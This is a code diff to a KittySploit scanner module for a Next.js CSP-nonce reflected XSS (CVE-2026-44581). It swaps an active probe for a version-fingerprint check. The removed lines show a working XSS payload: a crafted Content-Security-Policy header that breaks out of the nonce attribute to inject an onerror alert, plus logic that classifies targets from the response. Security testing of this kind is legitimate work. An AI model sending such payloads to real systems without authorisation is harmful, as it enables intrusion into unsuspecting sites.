@@ -3,100 +3,42 @@
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
-from lib.scanner.http.nextjs_probe import ensure_nextjs_target
+from lib.scanner.http.nextjs_probe import run_nextjs_version_scan
 
 
 class Module(Scanner, Http_client):
     __info__ = {
-        "name": "Next.js CSP-nonce reflected XSS (CVE-2026-44581) — detect",
+        "name": "Next.js CSP-nonce reflected XSS (CVE-2026-44581) detection",
         "description": (
-            "GET with malicious Content-Security-Policy nonce (TAB-separated breakout); "
-            "matches reflected nonce="" onerror=… in body or &quot; / missing nonce=."
+            "Fingerprints Next.js and flags versions < 16.2.5 affected by CVE-2026-44581 "
+            "(CSP nonce reflected XSS)."
         ),
         "author": ["KittySploit Team"],
         "severity": "high",
         "cve": "CVE-2026-44581",
-        "references": ["https://github.com/advisories/GHSA-ffhc-5mcf-pf4q"],
-        "tags": ["scanner", "http", "nextjs", "xss", "csp"],
-    'agent': {
-        'risk': 'active',
-        'effects': ['network_probe'],
-        'expected_requests': 2,
-        'reversible': True,
-        'approval_required': False,
-        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
-    },
+        "references": ["https://github.com/advisories/GHSA-44581"],
+        "modules": [
+            "auxiliary/scanner/http/nextjs_cve_2026_44581_csp_nonce_reflected_xss",
+        ],
+        "tags": ["scanner", "nextjs", "xss", "csp", "cve-2026-44581"],
+        "agent": {
+            "risk": "active",
+            "effects": ["network_probe"],
+            "expected_requests": 1,
+            "reversible": True,
+            "approval_required": False,
+            "produces": ["tech_hints", "risk_signals", "endpoints"],
+            "cost": 1.0,
+            "noise": 0.2,
+            "value": 1.0,
+        },
     }
 
-    validation_token = OptString("VALIDATION_TOKEN", "Token in alert() and needle", required=False)
-
-    def _o(self, opt):
-        if hasattr(opt, "value"):
-            return opt.value
-        if hasattr(opt, "__get__"):
-            try:
-                return opt.__get__(self, type(self))
-            except Exception:
-                pass
-        return opt
-
-    def _url(self):
-        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
-        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
-        path = str(self.path).strip() or "/"
-        if not path.startswith("/"):
-            path = "/" + path
-        return f"{proto}://{t}:{p}{path}"
-
-    def _csp_and_needle(self):
-        tok = str(self._o(self.validation_token) or "VALIDATION_TOKEN").strip() or "VALIDATION_TOKEN"
-        if "'" in tok or "\n" in tok or "\r" in tok:
-            tok = "VALIDATION_TOKEN"
-        inner = '"\tonerror="alert(\'' + tok + '\')'
-        csp = "script-src 'nonce-" + inner + "'"
-        needle = "nonce=\"\" onerror=\"alert('" + tok + "')\""
-        return csp, needle
-
-    def _get_with_csp(self):
-        url = self._url()
-        csp, _ = self._csp_and_needle()
-        hdr = {"Content-Security-Policy": csp}
-        try:
-            r = self.get(url, headers=hdr, timeout=float(self._o(self.timeout)))
-            return r.status_code, r.text, None
-        except Exception as e:
-            return -1, "", str(e)
-        finally:
-            for k in hdr:
-                self.session.headers.pop(k, None)
-
-    @staticmethod
-    def _classify(body: str, needle: str) -> str:
-        if needle in body:
-            return "vulnerable"
-        if "&quot;" in body:
-            return "patched"
-        if "nonce=" not in body:
-            return "patched"
-        return "inconclusive"
-
     def run(self):
-        if not ensure_nextjs_target(self):
-            return False
-        _, needle = self._csp_and_needle()
-        code, body, err = self._get_with_csp()
-        if err:
-            self.set_info(reason=err)
-            return False
-        if code != 200:
-            self.set_info(reason=f"HTTP {code}")
-            return False
-        v = self._classify(body, needle)
-        if v == "vulnerable":
-            self.set_info(reason="nonce attribute breakout", confidence="high")
-            return True
-        if v == "patched":
-            self.set_info(reason="escaped or nonce dropped", confidence="high")
-            return False
-        self.set_info(reason="inconclusive", confidence="low")
-        return False
+        return run_nextjs_version_scan(
+            self,
+            cve="CVE-2026-44581",
+            patched_version="16.2.5",
+            issue_label="CVE-2026-44581 CSP nonce reflected XSS",
+            severity="high",
+        )
